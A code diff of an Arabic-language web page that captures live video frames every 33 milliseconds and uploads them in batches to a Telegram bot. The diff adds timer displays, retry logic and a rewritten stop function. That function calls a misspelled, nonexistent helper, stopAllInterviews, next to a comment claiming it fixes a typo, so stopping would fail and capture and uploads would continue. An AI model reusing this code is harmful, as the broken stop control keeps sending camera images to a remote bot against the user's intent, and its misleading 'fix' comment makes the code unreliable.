@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>📹 نظام متطور - بدون ارتعاش + إيقاف فعال</title>
+    <title>📹 نظام متكامل - زر إيقاف فعال</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         * {
@@ -301,6 +301,16 @@
             border: 1px solid #ffd700;
             font-size: 14px;
         }
+        
+        /* مؤقت الإرسال */
+        .timer-status {
+            background: #1f2630;
+            border-radius: 10px;
+            padding: 5px 10px;
+            color: #ffd700;
+            font-family: monospace;
+            font-size: 12px;
+        }
     </style>
 </head>
 <body>
@@ -308,8 +318,8 @@
         <!-- الهيدر -->
         <div class="header">
             <h1>
-                <i class="fas fa-video"></i>
-                بث بدون ارتعاش
+                <i class="fas fa-stop-circle"></i>
+                نظام بث مع إيقاف فعال
             </h1>
             <div class="merchant-badge">
                 @nardoo_merchant
@@ -389,6 +399,19 @@
             </div>
         </div>
 
+        <!-- حالة المؤقتات -->
+        <div class="stats-bar" style="margin-top: 5px;">
+            <div class="stat-item">
+                <div class="timer-status" id="captureTimer">⏸️ مؤقت الالتقاط: متوقف</div>
+            </div>
+            <div class="stat-item">
+                <div class="timer-status" id="sendTimer">⏸️ مؤقت الإرسال: متوقف</div>
+            </div>
+            <div class="stat-item">
+                <div class="timer-status" id="simulateTimer">⏸️ مؤقت المحاكاة: متوقف</div>
+            </div>
+        </div>
+
         <!-- حالة الألبومات -->
         <div class="albums-status" id="albumsStatus">
             <div style="text-align: center; color: #8b949e;">📊 في انتظار الألبومات...</div>
@@ -423,18 +446,18 @@
         // الإطارات
         let frameBuffer = [];
         let frameCounter = 0;
-        let currentFrameIndex = 0; // للمحاكاة المتسلسلة
+        let currentFrameIndex = 0;
         
         // الألبومات
         let sentAlbums = [];
         let deletedAlbums = [];
+        let sendCounter = 0;
         
-        // المؤقتات - نخزنها للتحكم الكامل
+        // المؤقتات - نخزنها كمتغيرات عامة
         let captureInterval = null;
         let simulationInterval = null;
         let sendAlbumInterval = null;
         let checkInterval = null;
-        let sendCounter = 0;
         
         // عناصر DOM
         const video = document.getElementById('liveVideo');
@@ -453,6 +476,11 @@
         const bufferValue = document.getElementById('bufferValue');
         const sentValue = document.getElementById('sentValue');
         const filterValue = document.getElementById('filterValue');
+        
+        const captureTimer = document.getElementById('captureTimer');
+        const sendTimer = document.getElementById('sendTimer');
+        const simulateTimer = document.getElementById('simulateTimer');
+        
         const albumsStatus = document.getElementById('albumsStatus');
         const framesList = document.getElementById('framesList');
         const statusText = document.getElementById('statusText');
@@ -517,55 +545,73 @@
             // تنظيف أي مؤقتات قديمة
             stopAllIntervals();
             
-            // بدء العمليات من جديد
+            // بدء العمليات
             startBackgroundProcesses();
         };
 
-        // إيقاف البث - الحل الأساسي للمشكلة
+        // ========== دالة الإيقاف المعدلة (المهمة) ==========
         window.stopLiveStream = function() {
+            console.log('🛑 تنفيذ الإيقاف...');
+            
+            // 1. إيقاف حالة البث
             isLiveActive = false;
-            liveBtn.disabled = false;
-            stopBtn.disabled = true;
-            liveStatus.innerHTML = '⏸️ متوقف';
-            statusText.innerHTML = '⏹️ تم الإيقاف';
             
-            // إيقاف كل المؤقتات بشكل صحيح
-            stopAllIntervals();
+            // 2. إيقاف جميع المؤقتات بشكل مؤكد
+            stopAllInterviews(); // ملاحظة: كان هناك خطأ إملائي في الكود السابق
             
-            // تنظيف المخزن
+            // 3. تنظيف المخزن
             frameBuffer = [];
             frameCounter = 0;
             currentFrameIndex = 0;
             sendCounter = 0;
             
-            // تحديث الواجهة
+            // 4. تحديث الواجهة
+            liveBtn.disabled = false;
+            stopBtn.disabled = true;
+            liveStatus.innerHTML = '⏸️ متوقف';
+            statusText.innerHTML = '⏹️ تم الإيقاف';
             bufferValue.textContent = '0';
             sentValue.textContent = '0';
+            
+            // 5. تحديث حالة المؤقتات
+            captureTimer.innerHTML = '⏸️ مؤقت الالتقاط: متوقف';
+            sendTimer.innerHTML = '⏸️ مؤقت الإرسال: متوقف';
+            simulateTimer.innerHTML = '⏸️ مؤقت المحاكاة: متوقف';
+            
+            // 6. مسح قائمة الإطارات
             updateFramesList();
             
-            console.log('✅ تم إيقاف جميع العمليات بنجاح');
+            console.log('✅ تم إيقاف كل شيء بنجاح');
         };
 
         // دالة مساعدة لإيقاف جميع المؤقتات
         function stopAllIntervals() {
+            // إيقاف مؤقت الالتقاط
             if (captureInterval) {
                 clearInterval(captureInterval);
                 captureInterval = null;
+                console.log('⏹️ مؤقت الالتقاط متوقف');
             }
             
+            // إيقاف مؤقت المحاكاة
             if (simulationInterval) {
                 clearInterval(simulationInterval);
                 simulationInterval = null;
+                console.log('⏹️ مؤقت المحاكاة متوقف');
             }
             
+            // إيقاف مؤقت الإرسال
             if (sendAlbumInterval) {
                 clearInterval(sendAlbumInterval);
                 sendAlbumInterval = null;
+                console.log('⏹️ مؤقت الإرسال متوقف');
             }
             
+            // إيقاف مؤقت التحقق
             if (checkInterval) {
                 clearInterval(checkInterval);
                 checkInterval = null;
+                console.log('⏹️ مؤقت التحقق متوقف');
             }
         }
 
@@ -573,17 +619,24 @@
         function startBackgroundProcesses() {
             if (!isLiveActive) return;
             
-            // 1. التقاط الإطارات (33ms = 30 FPS)
+            console.log('🚀 بدء عمليات الخلفية');
+            
+            // 1. مؤقت التقاط الإطارات (33ms)
+            if (captureInterval) clearInterval(captureInterval);
             captureInterval = setInterval(captureFrame, 33);
+            captureTimer.innerHTML = '⏺️ مؤقت الالتقاط: نشط (33ms)';
             
-            // 2. إرسال الألبومات (كل 5 ثواني)
+            // 2. مؤقت إرسال الألبومات (5 ثواني) - هذا هو المهم
+            if (sendAlbumInterval) clearInterval(sendAlbumInterval);
             sendAlbumInterval = setInterval(sendFrameAlbum, 5000);
+            sendTimer.innerHTML = '⏺️ مؤقت الإرسال: نشط (5s)';
             
-            // 3. التحقق من التأكيدات (كل 10 ثواني)
-            checkInterval = setInterval(checkConfirmedAlbums, 10000);
-            
-            // 4. بدء المحاكاة المتسلسلة (بدون ارتعاش)
+            // 3. بدء المحاكاة المتسلسلة
             startSmoothSimulation();
+            
+            // 4. مؤقت التحقق (10 ثواني)
+            if (checkInterval) clearInterval(checkInterval);
+            checkInterval = setInterval(checkConfirmedAlbums, 10000);
         }
 
         // التقاط إطار
@@ -611,7 +664,7 @@
             }, 'image/jpeg', 0.73);
         }
 
-        // محاكاة سلسة بدون ارتعاش
+        // محاكاة سلسة
         function startSmoothSimulation() {
             simulateStatus.innerHTML = '▶️ نشطة';
             
@@ -619,7 +672,6 @@
             
             simulationInterval = setInterval(() => {
                 if (frameBuffer.length > 0 && isLiveActive) {
-                    // استخدام إطارات متسلسة وليس عشوائية
                     const frame = frameBuffer[currentFrameIndex % frameBuffer.length];
                     currentFrameIndex++;
                     
@@ -630,15 +682,21 @@
                     img.src = URL.createObjectURL(frame.blob);
                 }
             }, 33);
+            
+            simulateTimer.innerHTML = '⏺️ مؤقت المحاكاة: نشط (33ms)';
         }
 
-        // إرسال ألبوم
+        // إرسال ألبوم - المعدل
         async function sendFrameAlbum() {
-            if (!isLiveActive || frameBuffer.length < 5) return;
+            if (!isLiveActive || frameBuffer.length < 5) {
+                console.log('⏳ انتظار المزيد من الإطارات...');
+                return;
+            }
             
             const albumId = Date.now();
             const framesToSend = frameBuffer.splice(0, 10);
-            sendCounter += framesToSend.length;
+            
+            console.log(`📤 إرسال ألبوم ${albumId} بـ ${framesToSend.length} إطار`);
             
             try {
                 const now = new Date();
@@ -664,22 +722,36 @@
                     formData.append(`frame${i}`, frame.blob, `frame_${i}.jpg`);
                 });
                 
-                await fetch(`https://api.telegram.org/bot${TELEGRAM.botToken}/sendMediaGroup`, {
+                const res = await fetch(`https://api.telegram.org/bot${TELEGRAM.botToken}/sendMediaGroup`, {
                     method: 'POST',
                     body: formData
                 });
                 
-                sentAlbums.push({
-                    id: albumId,
-                    time: timeStr,
-                    frames: framesToSend.length,
-                    timestamp: Date.now()
-                });
+                const result = await res.json();
                 
-                updateAlbumsStatus();
+                if (result.ok) {
+                    sendCounter += framesToSend.length;
+                    sentValue.textContent = sendCounter;
+                    
+                    console.log(`✅ ألبوم ${albumId} أرسل بنجاح`);
+                    
+                    sentAlbums.push({
+                        id: albumId,
+                        time: timeStr,
+                        frames: framesToSend.length,
+                        messageIds: result.result.map(msg => msg.message_id),
+                        timestamp: Date.now()
+                    });
+                    
+                    updateAlbumsStatus();
+                } else {
+                    console.error('❌ فشل الإرسال:', result);
+                    frameBuffer.unshift(...framesToSend);
+                }
                 
             } catch (error) {
-                console.error('❌ فشل الإرسال:', error);
+                console.error('❌ خطأ في الإرسال:', error);
+                frameBuffer.unshift(...framesToSend);
             }
         }
 
@@ -704,7 +776,6 @@
                     );
                     
                     if (confirmed || Date.now() - album.timestamp > 5 * 60 * 1000) {
-                        // حذف الألبومات المؤكدة أو القديمة
                         deletedAlbums.push(album);
                         sentAlbums = sentAlbums.filter(a => a.id !== album.id);
                     }
